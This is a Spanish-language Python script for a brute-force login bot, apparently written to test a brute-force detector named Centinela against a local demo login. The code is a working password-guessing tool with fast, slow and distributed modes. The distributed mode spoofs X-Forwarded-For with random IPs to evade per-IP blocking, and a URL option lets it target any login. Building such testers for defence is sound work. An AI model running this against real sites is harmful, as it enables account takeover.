"""
bot_ataque.py

Bot de fuerza bruta reutilizable. Ataca el LOGIN DEMO (puerto 5000, el
sistema que "alguien más" tiene), no al detector directamente -- así se
prueba la integración completa de punta a punta, tal como pasaría con
un atacante real contra un sitio protegido por Centinela.

REFACTOR v2: las tres funciones principales (ataque_rapido / ataque_lento
/ ataque_distribuido) ahora aceptan un parámetro opcional `on_progreso`
-- un callback invocado en cada paso. Esto permite importar el módulo
desde el backend del dashboard y emitir mensajes por Socket.IO EN VIVO,
sin renunciar a la compatibilidad con la CLI (que sigue usando print).

USO CLI (mantiene compatibilidad 100% con la versión anterior):
    python bot_ataque.py --tipo rapido
    python bot_ataque.py --tipo rapido --usuario carla
    python bot_ataque.py --tipo rapido --intentos 15
    python bot_ataque.py --tipo lento --intentos 5
    python bot_ataque.py --tipo distribuido --ips 10
    python bot_ataque.py --tipo rapido --url http://localhost:5000/login

Requiere que estén corriendo, en este orden:
    1. python app.py                (Centinela, puerto 5050)
    2. python app_login_demo.py     (login demo, puerto 5000)
"""
import argparse
import random
import time
import requests

USUARIOS_COMUNES = ["admin", "carla", "roberto", "root", "test"]
PASSWORDS_COMUNES = ["123456", "password", "admin123", "qwerty",
                      "letmein", "12345678", "root", "changeme"]


def _ip_aleatoria():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))


def _intentar(url, ip, usuario, password):
    try:
        r = requests.post(url, json={"usuario": usuario, "password": password},
                           headers={"X-Forwarded-For": ip}, timeout=5)
        try:
            mensaje = r.json().get("mensaje", "")
        except Exception:
            mensaje = ""
        return r.status_code, mensaje
    except requests.exceptions.RequestException as e:
        return None, str(e)


def ataque_rapido(url, usuario=None, num_intentos=10, intervalo=0.3,
                  passwords=None, on_progreso=None):
    """Realiza un ataque rápido desde una única IP.

    Args:
        url: URL completa del endpoint de login a atacar.
        usuario: Usuario objetivo. Si None, elige aleatorio entre USUARIOS_COMUNES.
        num_intentos: Cantidad máxima de intentos a realizar.
        intervalo: Segundos de pausa entre intentos.
        passwords: Lista personalizada de contraseñas. Si es None usa PASSWORDS_COMUNES.
        on_progreso: Callable(str) invocado en cada evento. Si None usa print().
    Returns:
        tuple (bloqueado, intentos_realizados)
    """
    def _reportar(msg):
        if on_progreso:
            on_progreso(msg)
        else:
            print(msg)

    passwords = passwords or PASSWORDS_COMUNES
    usuario = usuario or random.choice(USUARIOS_COMUNES)
    ip = _ip_aleatoria()
    _reportar(f"[ATAQUE RÁPIDO] ip={ip} usuario={usuario} ({num_intentos} intentos, "
              f"{intervalo}s entre cada uno)")
    realizados = 0
    bloqueado = False
    for i in range(1, num_intentos + 1):
        pwd = random.choice(passwords)
        codigo, mensaje = _intentar(url, ip, usuario, pwd)
        realizados = i
        linea = (f"  intento {i:2d}: password='{pwd:12s}' -> HTTP {codigo}  {mensaje}")
        _reportar(linea)
        if codigo == 403:
            _reportar(f"  >>> BLOQUEADO en el intento {i}. Deteniendo ataque.")
            bloqueado = True
            break
        time.sleep(intervalo)
    return bloqueado, realizados


def ataque_lento(url, usuario=None, num_intentos=10, intervalo=2.0,
                 passwords=None, on_progreso=None):
    """Realiza un ataque lento (low-and-slow) desde una única IP.

    Args iguales a ataque_rapido. Returns iguales.
    """
    def _reportar(msg):
        if on_progreso:
            on_progreso(msg)
        else:
            print(msg)

    passwords = passwords or PASSWORDS_COMUNES
    usuario = usuario or random.choice(USUARIOS_COMUNES)
    ip = _ip_aleatoria()
    _reportar(f"[ATAQUE LENTO] ip={ip} usuario={usuario} ({num_intentos} intentos, "
              f"{intervalo}s entre cada uno)")
    realizados = 0
    bloqueado = False
    for i in range(1, num_intentos + 1):
        pwd = random.choice(passwords)
        codigo, mensaje = _intentar(url, ip, usuario, pwd)
        realizados = i
        linea = (f"  intento {i:2d}: password='{pwd:12s}' -> HTTP {codigo}  {mensaje}")
        _reportar(linea)
        if codigo == 403:
            _reportar(f"  >>> BLOQUEADO en el intento {i}. Deteniendo ataque.")
            bloqueado = True
            break
        time.sleep(intervalo)
    return bloqueado, realizados


def ataque_distribuido(url, usuario=None, num_ips=6, intervalo=0.2,
                       passwords=None, on_progreso=None):
    """Realiza un ataque distribuido: múltiples IPs atacando la misma cuenta.

    Args:
        url, usuario, passwords, on_progreso: igual que ataque_rapido.
        num_ips: Cantidad de IPs distintas (1 intento por IP).
        intervalo: Segundos entre cada IP.
    Returns:
        tuple (ips_bloqueadas_encontradas, total_intentos)
    """
    def _reportar(msg):
        if on_progreso:
            on_progreso(msg)
        else:
            print(msg)

    passwords = passwords or PASSWORDS_COMUNES
    usuario = usuario or random.choice(USUARIOS_COMUNES)
    _reportar(f"[ATAQUE DISTRIBUIDO] usuario={usuario} ({num_ips} IPs distintas, "
              f"1 intento cada una)")
    ips_bloqueadas = 0
    for i in range(1, num_ips + 1):
        ip = _ip_aleatoria()
        pwd = random.choice(passwords)
        codigo, mensaje = _intentar(url, ip, usuario, pwd)
        linea = (f"  IP {i}/{num_ips} ({ip}): password='{pwd:12s}' -> HTTP {codigo}  {mensaje}")
        _reportar(linea)
        if codigo == 403:
            ips_bloqueadas += 1
            _reportar("  >>> Esta IP fue bloqueada, pero el ataque sigue con nuevas IPs "
                      "(así es como el ataque distribuido intenta evadir el bloqueo por IP)")
        time.sleep(intervalo)
    return ips_bloqueadas, num_ips


def main():
    parser = argparse.ArgumentParser(description="Bot de fuerza bruta reutilizable para pruebas")
    parser.add_argument("--tipo", choices=["rapido", "lento", "distribuido"],
                         default="rapido", help="Tipo de ataque a simular")
    parser.add_argument("--url", default="http://localhost:5000/login",
                         help="URL del login a atacar (default: login demo en :5000)")
    parser.add_argument("--usuario", default=None,
                         help="Usuario objetivo (default: aleatorio entre los comunes)")
    parser.add_argument("--intentos", type=int, default=10,
                         help="Número de intentos (solo para rápido/lento)")
    parser.add_argument("--ips", type=int, default=6,
                         help="Número de IPs distintas (solo para distribuido)")
    parser.add_argument("--intervalo", type=float, default=None,
                         help="Intervalo en segundos entre intentos. Default: 0.3 rápido / 2.0 lento / 0.2 distribuido")
    args = parser.parse_args()

    print("=" * 60)
    print(f"Bot de ataque -> objetivo: {args.url}")
    print("=" * 60)

    if args.intervalo is None:
        args.intervalo = 0.3 if args.tipo == "rapido" else (2.0 if args.tipo == "lento" else 0.2)

    if args.tipo == "rapido":
        ataque_rapido(args.url, args.usuario, args.intentos, args.intervalo)
    elif args.tipo == "lento":
        ataque_lento(args.url, args.usuario, args.intentos, args.intervalo)
    else:
        ataque_distribuido(args.url, args.usuario, args.ips, args.intervalo)

    print("\nAtaque finalizado. Revisa el dashboard de Centinela en "
          "http://localhost:5050 para ver el detalle.\n")


if __name__ == "__main__":
    main()
